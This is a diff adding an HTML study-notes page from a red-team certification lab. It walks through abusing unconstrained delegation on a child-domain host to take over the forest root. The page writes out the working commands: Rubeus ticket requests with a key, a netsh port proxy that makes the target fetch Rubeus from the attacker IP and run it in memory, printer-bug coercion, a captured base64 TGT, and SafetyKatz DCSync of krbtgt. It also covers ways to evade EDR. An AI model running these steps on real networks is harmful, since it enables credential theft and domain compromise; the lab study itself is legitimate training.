@@ -1,0 +1,218 @@
+---
+title: Cross Domain Attacks - Unconstrained Delegation to Enterprise Admin
+layout: docs
+---
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cross Domain Attacks - Unconstrained Delegation to Enterprise Admin - CRTE</title>
+  <link rel="shortcut icon" href="../../../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../../../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .crtp-sidebar { padding: 20px; }
+    .crtp-sidebar h3 { color: #ffdb70; margin-bottom: 15px; font-size: 1.1rem; }
+    .crtp-sidebar .portfolio-link { 
+      display: block; 
+      padding: 10px 12px; 
+      margin-bottom: 15px; 
+      color: #ffdb70; 
+      text-decoration: none; 
+      border-radius: 6px; 
+      font-size: 0.9rem; 
+      font-weight: 600;
+      background: #2a2a2a;
+      transition: all 0.2s;
+    }
+    .crtp-sidebar .portfolio-link:hover { 
+      background: #ffdb70; 
+      color: #1a1a1a; 
+    }
+    .crtp-sidebar a { display: block; padding: 8px 12px; margin: 4px 0; color: #d6d6d6; text-decoration: none; border-radius: 6px; font-size: 0.9rem; transition: all 0.2s; }
+    .crtp-sidebar a:hover { background: #2a2a2a; color: #ffdb70; }
+    .crtp-sidebar a.active { background: #ffdb70; color: #1a1a1a; font-weight: 600; }
+    .main-content { max-width: 100% !important; }
+    .about { max-width: 100% !important; padding: 20px 40px !important; }
+    .notion-content { line-height: 1.6; }
+    .notion-content img { max-width: 100%; height: auto; margin: 20px 0; border-radius: 8px; }
+    .notion-content h1, .notion-content h2, .notion-content h3 { color: #fafafa; margin: 20px 0 10px; }
+    .notion-content p { margin: 15px 0; color: #d6d6d6; }
+    .notion-content ul, .notion-content ol { margin: 15px 0; padding-left: 30px; }
+    .notion-content li { margin: 5px 0; color: #d6d6d6; }
+    .notion-content code { background: #2a2a2a; padding: 2px 6px; border-radius: 4px; font-family: 'Courier New', monospace; color: #ffdb70; }
+    .notion-content pre { background: #1e1e1e; border-left: 4px solid #ffdb70; padding: 15px; margin: 20px 0; border-radius: 0 8px 8px 0; overflow-x: auto; }
+    .notion-content a { color: #ffdb70; text-decoration: underline; }
+    .notion-content strong { color: #fafafa; font-weight: 600; }
+  </style>
+</head>
+<body>
+  <main>
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../../../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTE Study Notes</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Navigation</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        <div class="crtp-sidebar">
+          <a href="../../" class="portfolio-link">← Portfolio</a>
+          <h3>Sections</h3>
+          <a href="overview.html" class="">Overview</a>
+
+          <a href="part-01-introduction.html" class="">Introduction</a>
+          <a href="part-02-enumeration.html" class="">Enumeration</a>
+          <a href="part-03-privilege-escalation.html" class="">Privilege Escalation</a>
+          <a href="part-04-kerberoasting-attack.html" class="">Kerberoasting attack</a>
+          <a href="part-05-targeted-kerberoasting.html" class="">Privilege Escalation - Targeted Kerberoasting</a>
+          <a href="part-06-laps-attack.html" class="">Privilege Escalation - LAPS Attack</a>
+          <a href="part-07-dumping-lsass-credentials.html" class="">Dumping LSASS Credentials</a>
+          <a href="part-08-gmsa-attack.html" class="">Privilege Escalation - gMSA Attack</a>
+          <a href="part-09-lsass-mde-bypass.html" class="">LSASS Attack With MDE Bypass</a>
+          <a href="part-10-pass-the-certificates-attack.html" class="">Pass The Certificates Attack</a>
+          <a href="part-11-unconstrained-delegation.html" class="">Privilege Escalation - Unconstrained Delegation</a>
+          <a href="part-12-constrained-delegation.html" class="">Privilege Escalation - Constrained Delegation</a>
+          <a href="part-13-rbcd.html" class="">Privilege Escalation - RBCD</a>
+          <a href="part-14-golden-ticket.html" class="">Domain Persistence - Golden Ticket attack</a>
+          <a href="part-15-silver-ticket.html" class="">Domain Persistence - Silver Ticket Attack</a>
+          <a href="part-16-diamond-ticket.html" class="">Domain Persistence - Diamond Ticket Attack</a>
+          <a href="part-17-skeleton-key.html" class="">Domain Persistence - Skeleton Key Attack</a>
+          <a href="part-18-sapphire-ticket.html" class="">Domain Persistence - Sapphire Ticket Attack</a>
+          <a href="part-19-adminsdholder.html" class="">Domain Persistence - AdminSDHolder attack</a>
+          <a href="part-20-adcs-attacks.html" class="">Cross Domain Attacks - ADCS Attacks</a>
+          <a href="part-21-shadow-credentials.html" class="">Shadow Credentials - Abusing User Object</a>
+          <a href="part-22-cross-domain-unconstrained.html" class="active">Cross Domain Attacks - Unconstrained Delegation to Enterprise Admin</a>
+          <a href="part-23-azure-ad-phs.html" class="">Cross Domain Attacks - Azure AD Integration PHS</a>
+          <a href="part-24-child-to-forest-trust-key.html" class="">Cross Domain Attacks - Child to Forest Root - SID History Trust Key Abuse</a>
+          <a href="part-25-child-to-forest-sidhistory-krbtgt.html" class="">Cross Domain Attacks - Child to Forest Root - SID History KRBTGT Hash Abuse</a>
+          <a href="part-26-cross-forest-kerberoast.html" class="">Cross Forest Attacks - Kerberoast Attack</a>
+          <a href="part-27-protocol-transition.html" class="">Cross Forest Attacks - Constrained Delegation with Protocol Transition</a>
+          <a href="part-28-cross-forest-unconstrained.html" class="">Cross Forest Attacks - Unconstrained Delegation</a>
+          <a href="part-29-trust-key-shared-resources.html" class="">Cross Forest Attacks - Trust Key Abuse to Access Shared Resources</a>
+          <a href="part-30-injecting-sidhistory.html" class="">Cross Forest Attacks - Injecting SID History to Bypass SID Filtering</a>
+          <a href="part-31-mssql-database-links.html" class="">Trust Abuse - MSSQL Servers Database Links</a>
+          <a href="part-32-foreign-security-principals.html" class="">Cross Forest Attacks - Foreign Security Principals & ACLs</a>
+          <a href="part-33-pam-trust.html" class="">Cross Forest Attacks - Abusing PAM Trust</a>
+          <a href="part-34-trusting-to-trusted.html" class="">Cross Forest Attacks - Trusting to Trusted - Trust Key</a>
+          <a href="part-35-abusing-trust-transitivity.html" class="">Cross Forest Attacks - Abusing Trust Transitivity</a>
+        </div>
+        <div class="separator"></div>
+        <ul class="contacts-list">
+          <li class="contact-item">
+            <div class="icon-box">
+              <ion-icon name="arrow-back-outline"></ion-icon>
+            </div>
+            <div class="contact-info">
+              <p class="contact-title">Back</p>
+              <a href="../../../" class="contact-link">Portfolio</a>
+            </div>
+          </li>
+        </ul>
+      </div>
+    </aside>
+
+    <div class="main-content">
+      <article class="about active" data-page="about">
+        <header class="h2 article-title">Cross Domain Attacks - Unconstrained Delegation to Enterprise Admin</header>
+        <section class="about-text notion-content">
+<p id="30c79e9a-d7c9-80a1-ae6b-e3aa52712705" class="">Cross-forest attacks leveraging <strong>unconstrained delegation</strong> exploit a fundamental trust weakness between <strong>child and root domains</strong>, allowing an attacker to escalate privileges and compromise the <strong>Enterprise Admins</strong> group. In this scenario, we focus on coercing authentication from the <strong>root forest domain controller (techcorp.local DC)</strong> to a <strong>compromised machine (us-web)</strong> in the <strong>child domain (us.techcorp.local)</strong> that has <strong>unconstrained delegation enabled</strong>.</p><h3 id="30c79e9a-d7c9-8041-9834-fc12cab02408" class=""><strong>Why Does This Attack Work?</strong></h3><p id="30c79e9a-d7c9-803c-80fc-f3665f8bd2ce" class="">Unconstrained delegation allows a server to <strong>impersonate any user who authenticates to it</strong> by storing their <strong>Ticket Granting Ticket (TGT)</strong> in memory. In a multi-domain or cross-forest scenario, this means that if we can <strong>force an Enterprise Admin or Domain Controller from the root domain to authenticate to our compromised machine in the child domain</strong>, we can extract their TGT and escalate privileges across the entire forest.</p><p id="30c79e9a-d7c9-8025-9995-e211a2af14f9" class="">In this lab scenario, the <strong>us-web machine</strong> in <code>us.techcorp.local</code> has unconstrained delegation enabled. This means that any account that <strong>authenticates to this machine</strong> will have its <strong>TGT cached</strong>. By coercing the <strong>root forest domain controller (techcorp.local DC)</strong> to authenticate to <code>us-web</code>, we capture its <strong>TGT</strong>, which allows us to impersonate it.</p><h3 id="30c79e9a-d7c9-8006-a955-e1618ba4ad0c" class=""><strong>Breaking Down the Attack</strong></h3><p id="30c79e9a-d7c9-80f5-b528-de2da66a2db5" class="">The attack starts with a <strong>low-privileged foothold</strong> but escalates due to the misconfiguration of <strong>unconstrained delegation</strong> in a cross-domain trust scenario.</p><ol><li><strong>Compromising an Unconstrained Delegation Host</strong><p id="30c79e9a-d7c9-80db-a583-c258f1a33c49" class="">The attacker gains control over <code>us-web</code>, a machine with <strong>unconstrained delegation enabled</strong>. This machine will automatically cache <strong>TGTs of any account that authenticates to it</strong>, including privileged accounts like domain controllers.</p></li></ol><ol><li><strong>Coercing the Root Domain Controller to Authenticate</strong><p id="30c79e9a-d7c9-80d6-8675-c5ade3185cf2" class="">Since <strong>domain controllers constantly authenticate with each other</strong>, the attacker forces the <strong>root domain controller (techcorp.local DC)</strong> to connect to <code>us-web</code>. This is done using techniques like <strong>printer bug (MS-RPRN)</strong>, <strong>PetitPotam (MS-EFSRPC)</strong>, or <strong>spooler service abuse</strong>, which trigger the DC to authenticate to a target machine.</p></li></ol><ol><li><strong>Extracting the Root Domain Controller&#x27;s TGT</strong><p id="30c79e9a-d7c9-8040-b19f-c5a83687707d" class="">Once the root DC connects to <code>us-web</code>, its <strong>TGT is stored in memory</strong> on the compromised server. The attacker can now extract this TGT using <strong>Rubeus in monitor mode</strong>, capturing the domain controller’s authentication ticket.</p></li></ol><ol><li><strong>Impersonating the Root Domain Controller &amp; Running DCSync</strong><p id="30c79e9a-d7c9-80f9-9cb9-e25b28f13e99" class="">With the TGT of the <strong>techcorp.local DC</strong>, the attacker can <strong>impersonate the root DC</strong> and perform a <strong>DCSync attack</strong>. This allows dumping of the <strong>krbtgt account hash</strong> of the <strong>root domain (techcorp.local)</strong>, effectively giving the attacker control over the entire Active Directory forest.</p></li></ol><ol><li><strong>Forging a Golden Ticket &amp; Gaining Enterprise Admin Privileges</strong><p id="30c79e9a-d7c9-80e5-94ac-dac0a32a64f1" class="">Using the extracted <strong>krbtgt hash</strong>, the attacker generates a <strong>Golden Ticket</strong> that grants <strong>Enterprise Admin privileges</strong>. Since Enterprise Admins can control <strong>all domains in the forest</strong>, this means full forest compromise.</p></li></ol><h3 id="30c79e9a-d7c9-80df-8db5-ebf5748bea9e" class=""><strong>Why This is a Cross-Forest Issue</strong></h3><p id="30c79e9a-d7c9-8058-9d32-f888d39ad6e3" class="">The attack works because <strong>domain controllers in the root and child domains trust each other</strong>, and unconstrained delegation does not limit which domain’s tickets can be cached. By coercing authentication <strong>from the root domain to a child domain machine</strong>, we escalate across domain boundaries.</p><p id="30c79e9a-d7c9-8082-b3ac-f6fdf1d0e224" class="">Without unconstrained delegation, a domain controller would not <strong>store a reusable authentication ticket</strong> on a child domain machine. However, because <code>us-web</code> has <strong>unconstrained delegation</strong>, it stores the TGT of the root DC, allowing an attacker to <strong>escalate from child domain admin to Enterprise Admin</strong>.</p><h3 id="30c79e9a-d7c9-8094-bac5-eb45a7671856" class=""><strong>Final Understanding</strong></h3><p id="30c79e9a-d7c9-80b8-aa61-d813e2d21579" class="">This attack highlights how <strong>misconfigurations in delegation settings</strong> can lead to full <strong>forest compromise</strong>. Unconstrained delegation allows <strong>any account that authenticates to a machine to have its TGT cached</strong>, and when a domain controller from the <strong>root domain</strong> is coerced into authenticating, its <strong>TGT can be stolen and used to compromise the entire Active Directory environment</strong>. By abusing <strong>cross-domain trust</strong>, we escalate from a <strong>single misconfigured child domain machine to full Enterprise Admin privileges in the root domain</strong>.</p><p id="30c79e9a-d7c9-8011-af37-ee3b81b51f6e" class="">Let’s elevate our privilege as user webmaster, we already know that <code><strong>webmaster</strong></code> has <strong>local admin</strong> inside <code><strong>us-web</strong></code> machine. Let’s use Rubeus to request, inject and spawn webmaster TGT into a new process.</p><p id="30c79e9a-d7c9-8024-9208-d5f871637504" class="">Let’s start by encoding our Rubeus argument (<code><strong>asktgt</strong></code>), using Arsplit.bat file and do the copy/paste of the encoded argument into our current session.</p><p id="30c79e9a-d7c9-8039-9fce-efaf949e5ccd" class=""><code>Argsplit.bat</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20228.png" alt="Image"/><p id="30c79e9a-d7c9-80c5-be39-efe3068d94a4" class="">Let’s now run Rubeus in the memory using Loader.exe to request webmaster’s TGT and inject it into a new cmd process.</p><p id="30c79e9a-d7c9-8005-a8bc-fd427bda532d" class=""><code>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args &quot;%Pwn%&quot; /user:webmaster /aes256:2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20229.png" alt="Image"/><p id="30c79e9a-d7c9-808a-b4cd-e5ea5f76e3db" class="">As we can see, we were able to elevate our privilege as webadmin by injecting it’s TGT into a new cmd process.</p><p id="30c79e9a-d7c9-8053-bff3-cff4bf42fe14" class="">Now, in this new process let’s start by sending our loader.exe into us-web, since we will be executing Rubeus in the memory in this target to abuse the Unconstrained Delegation.</p><h3 id="30c79e9a-d7c9-805c-ba0d-e99474780573" class="">Mapping Shares to local system</h3><p id="30c79e9a-d7c9-80a4-b96e-e3665969c223" class="">Let’s start by Mapping shares from remote servers to our local system to allow seamless access to the target machine&#x27;s files as if they were stored locally. <br/>This is useful for tasks like transferring payloads, extracting sensitive data, or staging tools for further exploitation. We will use this approach to be able to transfer files to our target <code>US-Web</code>.</p><p id="30c79e9a-d7c9-8043-837b-cd6cac0ccab1" class=""><strong>Advantages:</strong></p><ol><li><strong>Convenience</strong>: It simplifies interaction with the target&#x27;s file system, enabling easy copying, reading, or modification of files.</li></ol><ol><li><strong>Efficiency</strong>: File transfers and tool deployments are faster and more straightforward compared to manual uploads or downloads.</li></ol><ol><li><strong>Persistence</strong>: The mapped drive can remain accessible for the session, allowing continuous interaction without repeatedly authenticating.</li></ol><ol><li><strong>Stealth</strong>: Uses built-in Windows functionality, making the activity less suspicious to some monitoring tools.</li></ol><blockquote id="30c79e9a-d7c9-80ec-bbdd-fc906d33c9ed" class=""><strong>Note: If your mapping does not work on the one-liner passing the password on it, it’s probably due to special characters on the credential and you may get error Password i not correct.<br/>To bypass this, you can simply do the whole mapping command and put the password after it is asked.</strong></blockquote><p id="30c79e9a-d7c9-8089-bd38-fe1d34e0377a" class=""><code>net use x: \\US-WEB\C$\Users\Public</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20230.png" alt="Image"/><p id="30c79e9a-d7c9-80ef-8dcb-da05f75b63d4" class="">We could successfully map drive <code><strong>x</strong></code> to <code><strong>US-WEB</strong></code> host on <code><strong>C:\Users\Public</strong></code> directory.</p><p id="30c79e9a-d7c9-801d-9490-fa31a95cd3a5" class="">Let’s now Copy our loader into our target using <code><strong>xcopy</strong></code>.<br/><code>echo F | xcopy C:\AD\Tools\Loader.exe x:Loader.exe /y</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20231.png" alt="Image"/><p id="30c79e9a-d7c9-8048-9ab0-f2594dfeaecb" class="">The <code><strong>echo F</strong></code> we pass in the beginning is to tell prompt that we are transferring a file.</p><p id="30c79e9a-d7c9-8074-923b-fe8703b4e1d3" class="">After uploading our loader into the target, we can now delete our mapped driver x since we don’t need it anymore.</p><p id="30c79e9a-d7c9-8070-b56d-de14e389ed47" class=""><code>net use x: /delete</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%2082.png" alt="Image"/><p id="30c79e9a-d7c9-805f-b2d9-d40f454f5065" class="">We have just deleted the <code><strong>x</strong></code> mapped driver.</p><p id="30c79e9a-d7c9-8044-96e5-ffe2697e842e" class="">What If we simply  download and execute Rubeus in memory now using our Loader.exe on the target machine?</p><p id="30c79e9a-d7c9-80b0-a3d8-fbd5354c6903" class="">We could simply run Rubeus calling it straight from our attacking IP, but we would easily be caught by Defender or any sort of defense mechanism in place on our network.</p><h3 id="30c79e9a-d7c9-8078-a22c-c1fde8ca40ed" class="">Let’s highlights the importance of my statement above.</h3><p id="30c79e9a-d7c9-80a3-b798-e3f4bfe3ddfa" class=""> Evading detection by security tools when performing actions such as credential dumping with tools like SafetyKatz can be a trigger to compromise all our Red Team operation and let me tell you why.</p><ul><li><strong>Direct Execution is Easily Detected</strong>: Running tools like Rubeus directly from an attacker&#x27;s IP address makes it easy for security tools to detect the activity. Security mechanisms, such as <strong>Windows Defender and Microsoft Defender for Endpoint (MDE)</strong>, are designed to identify known malicious tools, their signatures, and their behaviors.<ul><li><strong>Signature-Based Detection:</strong> Security tools often use signature-based detection to identify known malicious software. If Rubeus is run directly, its known signatures can trigger alerts.</li></ul><ul><li><strong>Behavior-Based Detection</strong>: Security tools also monitor the behavior of programs. Running Rubeus directly, especially when it tries to access the memory of the LSASS process, can trigger behavioral-based detections.</li></ul></li></ul><ul><li><strong>Network Traffic Monitoring:</strong> When Rubeus is executed from an external IP, it generates network traffic that can be monitored and flagged by security tools.<ul><li><strong>Downloading from External Sources:</strong> Downloading an executable from a remote machine is considered suspicious and can trigger behavior-based detection by Windows Defender.</li></ul><ul><li><strong>Process Creation and Command Line Logs:</strong> Process creation logs and command line logs can reveal suspicious activity, such as the execution of known hacking tools with particular arguments.</li></ul></li></ul><ul><li><strong>LSASS Process Access is a Red Flag:</strong> Tools like SafetyKatz attempt to access the LSASS process to extract credentials from memory. This is a highly suspicious activity that will easily be detected and is a major indicator of a malicious attack.</li></ul><ul><li><strong>Bypassing Detection Mechanisms</strong>: To avoid detection, attackers need to implement various bypass techniques, including:<ul><li><strong>Obfuscation:</strong> Obfuscating the tool&#x27;s code and arguments to avoid signature-based detection. This can involve renaming variables, removing comments, and encoding parameters.</li></ul><ul><li><strong>Memory Loading:</strong> Loading the tool into memory without writing it to disk, using a tool like a loader, avoids file-based detection.</li></ul><ul><li><strong>Process Injection</strong>: Injecting shellcode into a trusted process can allow covert execution without using standard API calls that are heavily monitored.</li></ul><ul><li><strong>Port Forwarding</strong>: Forwarding network traffic from the local machine to a student VM can mask the attacker&#x27;s IP address and evade detection.</li></ul><ul><li><strong>Using Built-in Tools</strong>: The course emphasizes using built-in tools as much as possible, as they are less likely to be flagged by security software. For example, using <code>netsh</code> to set up port forwarding or built-in Windows utilities over custom tools.</li></ul><ul><li><strong>Mimicking Normal Behavior</strong>: Downloading tools using a web browser instead of a command-line tool, for example, can help blend in with normal network activity.</li></ul></li></ul><p id="30c79e9a-d7c9-80a0-9e42-d87072e49218" class="">In summary, running Rubeus directly from an attacking IP is highly likely to be detected by most modern security tools. Therefore, attackers use advanced techniques like obfuscation, memory loading, process injection, and port forwarding to evade detection. The course material emphasizes these techniques in order to learn about these types of attacks and to improve red team Opsec.</p><h3 id="30c79e9a-d7c9-80d1-9c8e-e1c2242068e9" class="">Portforwarding to bypass EDR</h3><p id="30c79e9a-d7c9-805a-ae94-df3bdfdce13a" class="">To avoid being caught by any defensive mechanism, we can  simply create a PortForwarding on the target machine then call Rubeus using it’s <a href="http://localhost">localhost</a> IP.</p><p id="30c79e9a-d7c9-8013-991c-eed75042c2a8" class="">Let’s remotelly access the us-web server and configure the portforwarding.</p><p id="30c79e9a-d7c9-8029-a581-d48ee52f1e24" class=""><code>winrs -r:us-web cmd</code></p><p id="30c79e9a-d7c9-808b-8f6b-d681208d74be" class=""><code>netsh interface portproxy add v4tov4 listenport=8080 listenaddress=127.0.0.1 connectport=80 connectaddress=192.168.100.163</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20232.png" alt="Image"/><p id="30c79e9a-d7c9-805e-a501-e0b3114b8bdd" class="">Now we can also check if our portforwarding was configured properly with the following command.</p><p id="30c79e9a-d7c9-805e-92c4-c24ccbc370f7" class=""><code>netsh interfaace portproxy show all</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20233.png" alt="Image"/><p id="30c79e9a-d7c9-80a3-9df2-f42afa6863d5" class="">We can see above that portforwarding has been properly configured and that traffic from local IP 127.0.0.1 on port 8080 will be automatically forwarded to our attacking IP 192.168.100.163 on port 80.</p><p id="30c79e9a-d7c9-80a6-8e2a-f24184a66340" class="">On our attacking machine, we should host our Rubeus.exe file, remember that our target will be requesting it to run it into the memory. I’m using HFS.exe, but this could be python2 or python3 for example. Also make sure that your local Firewall has been disabled since by default Windows blocks some connections from external networks into local network.</p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20234.png" alt="Image"/><p id="30c79e9a-d7c9-8097-906d-e4f134e1cd64" class="">Let’s now encode the argument(<code><strong>monitor</strong></code>) we will be using when putting Rubeus on monitor mode and for this we will use the ArgSplit.bat file and we must also copy/paste these encoded argument into our session were we will be running Rubeus in monitor mode.</p><p id="30c79e9a-d7c9-808f-bfa2-ddb8ecb5eb4c" class=""><code>ArgSplit.bat</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20235.png" alt="Image"/><p id="30c79e9a-d7c9-80df-a231-e0c55655da7e" class="">We can now start our Rubeus in monitor mode on our target <code><strong>us-web</strong></code> machine.<br/><code>C:\Users\Public\Loader.exe -Path </code><code><a href="http://127.0.0.1:8080/Rubeus.exe">http://127.0.0.1:8080/Rubeus.exe</a></code><code> -args %Pwn% /targetuser:TECHCORP-DC$ /interval:5 /nowrap</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20236.png" alt="Image"/><p id="30c79e9a-d7c9-80fa-9067-f2cbd3d66539" class="">Now that we do have our Rubeus in monitor mode on our target, let’s run MS-RPRN.exe on our attacking machine to abuse the printer bug. this time we will be pointing the root forest domain controller <code><strong>techcorp-dc</strong></code> as our target.</p><p id="30c79e9a-d7c9-802f-ab5b-cc748976c947" class=""><code>C:\AD\Tools\MS-RPRN.exe \\techcorp-dc.techcorp.local \\us-web.us.techcorp.local</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20237.png" alt="Image"/><p id="30c79e9a-d7c9-80e2-bc99-e94ca0259c17" class="">Now if we check our Rubeus in monitor mode again, we will see that this time we do have one new ticket. This is TECHCORP-DC$’s TGT.</p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20238.png" alt="Image"/><p id="30c79e9a-d7c9-8032-9cc6-f51a4bafa978" class="">We can copy Base64EncodedTicket, remove unnecessary spaces and newline (if any) and use the ticket with Rubes on the our attacking host. <br/>The Rubeus in monitor mode can be stopped already.<br/></p><p id="30c79e9a-d7c9-8062-86da-d0b1e538c836" class="">Let’s now encode the argument(<code><strong>ptt</strong></code>) we will be using when putting Rubeus and for this we will use the ArgSplit.bat file and we must also copy/paste these encoded argument into our session were we will be running Rubeus, in this case it’s on our own attacking machine.</p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20239.png" alt="Image"/><p id="30c79e9a-d7c9-80eb-9ecb-f2da4d1ff887" class=""><code>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /ticket:&lt;TheEncodedBase64Ticket&gt;</code></p><p id="30c79e9a-d7c9-8065-a6d0-e8ed4cec0bf5" class=""><code>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /ticket: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</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20240.png" alt="Image"/><p id="30c79e9a-d7c9-8094-986b-ee8620c70681" class="">As we can see above, we were able to successfully request and inject the Enterprise Domain Controller’s TGT and we can also checking this with <code><strong>klist</strong></code> command.</p><p id="30c79e9a-d7c9-802d-82e4-c0cd4e42c27d" class=""><code>klist</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20241.png" alt="Image"/><h2 id="30c79e9a-d7c9-8095-b745-d99cdb1bdf35" class="">DCSync Attack</h2><p id="30c79e9a-d7c9-80bd-8856-ea9611a3445e" class="">We can now go for a DCSync attack and simply request the Domain Enterprise’s KRBTGT account’s keys.<br/>Let’s now encode the argument(<code><strong>lsadump::dcsync</strong></code>) we will be using when putting SafetyKatz and for this we will use the ArgSplit.bat file and we must also copy/paste these encoded argument into our session were we will be running SafetyKatz.</p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20242.png" alt="Image"/><p id="30c79e9a-d7c9-80d6-b908-e33483a6b3e0" class="">Now that we have all setup, we can now run SafetyKatz.exe from memory using Loader.exe and request for KRBTGT’s keys.<br/><code>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args &quot;%Pwn% /user:techcorp\krbtgt /domain:techcorp.local&quot; &quot;exit&quot;</code></p><pre id="30c79e9a-d7c9-80bb-81af-d437b1328b15" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">mimikatz(commandline) # lsadump::dcsync /user:techcorp\krbtgt /domain:techcorp.local
+[DC] &#x27;techcorp.local&#x27; will be the domain
+[DC] &#x27;Techcorp-DC.techcorp.local&#x27; will be the DC server
+[DC] &#x27;techcorp\krbtgt&#x27; will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
